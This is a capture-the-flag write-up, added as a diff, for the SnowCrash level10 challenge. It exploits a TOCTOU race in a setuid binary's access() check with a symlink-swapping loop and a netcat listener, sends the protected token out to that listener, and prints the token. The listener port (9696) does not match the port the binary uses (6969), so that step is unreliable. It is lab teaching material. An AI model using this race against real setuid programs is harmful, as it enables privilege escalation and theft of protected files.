@@ -1,0 +1,95 @@
+level10@SnowCrash:~$ ls -l
+total 16
+-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
+-rw-------  1 flag10 flag10     26 Mar  5  2016 token
+
+
+We can see that there's a file named token owned by the user flag10 and an executable owned by flag10 and the level10 is in the group to whom own the executable, and the most important the transfer of privileges process with the setuid
+
+level10@SnowCrash:~$ strings level10 
+
+...
+
+read
+stdout
+inet_addr
+open
+access
+strerror
+
+...
+
+[^_]
+%s file host
+	sends file to host if you have access to it
+Connecting to %s:6969 .. 
+Unable to connect to host %s
+.*( )*.
+Unable to write banner to host %s
+Connected!
+Sending file .. 
+Damn. Unable to open file
+Unable to read from file: %s
+wrote file!
+You don't have access to %s
+;*2$"
+
+.
+
+
+level10@SnowCrash:~$ nm level10 -u
+         w _Jv_RegisterClasses
+         U __errno_location@@GLIBC_2.0
+         w __gmon_start__
+         U __libc_start_main@@GLIBC_2.0
+         U __stack_chk_fail@@GLIBC_2.4
+         U access@@GLIBC_2.0
+         U connect@@GLIBC_2.0
+         U exit@@GLIBC_2.0
+         U fflush@@GLIBC_2.0
+         U htons@@GLIBC_2.0
+         U inet_addr@@GLIBC_2.0
+         U open@@GLIBC_2.0
+         U printf@@GLIBC_2.0
+         U puts@@GLIBC_2.0
+         U read@@GLIBC_2.0
+         U socket@@GLIBC_2.0
+         U strerror@@GLIBC_2.0
+         U write@@GLIBC_2.0
+
+
+we can observe that the program use the access(2) that can be exploitable in the TOCTOU (time-of-check to time-of-use) exploit
+
+Access is intended to check whether the real user who executed the setuid program would normally be allowed to write/read/exec the file (i.e., access checks the real userid rather than effective userid).
+
+
+we will use the race condition culnirability to exploit this :
+
+steps: 
+	we will create a file in the tmp dir that will be named as bingo,
+	
+		touch /tmp/bingo
+
+	we will create a link to the bingo file    named /tmp/s 
+	we will create a link to the ~/token file  named /tmp/s
+
+while true; do 
+ln -sf /tmp/bingo /tmp/s;
+ln -sf ~/token /tmp/s;
+done
+
+	in another window we listen to the 6969 port with nc -l 9696 
+
+	and in other terminal we do this
+
+	while true; do
+	./level10 /tmp/s ip;
+	done
+
+and bingo the token appear;
+woupa2yuojeeaaed06riuj63c
+
+
+SOurces : http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Race_Condition.pdf
+https://www.usenix.org/legacy/publications/library/proceedings/sec04/tech/full_papers/dean/dean_html/accessopen.html
+
